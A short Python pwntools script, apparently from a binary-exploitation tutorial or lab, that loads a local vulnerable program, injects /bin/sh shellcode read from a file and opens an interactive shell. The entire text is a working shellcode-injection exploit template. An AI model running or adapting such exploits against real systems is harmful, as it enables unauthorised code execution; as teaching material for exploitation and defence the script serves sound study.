#!/usr/bin/env python
from pwn import *


BIN = "./vuln"
context.binary = BIN
elf = ELF(BIN)

machine_code_addr = elf.symbols["machine_code"]

# Later, we'll see how to use pwntools to solve this step as well.
with open("binsh_shellcode.bin", "rb") as fin:
    shellcode = fin.read()

# First part: inject
payload = b""
payload += shellcode

io = process(BIN)
io.send(payload)
io.interactive()
